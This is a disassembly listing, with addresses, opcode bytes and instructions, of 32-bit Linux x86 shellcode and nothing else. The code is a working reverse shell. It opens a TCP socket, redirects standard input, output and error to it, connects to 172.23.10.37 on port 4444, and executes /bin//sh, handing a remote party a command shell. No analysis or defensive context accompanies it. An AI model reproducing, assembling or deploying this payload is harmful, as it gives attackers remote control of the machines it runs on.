00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  68AC170A25        push dword 0x250a17ac
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
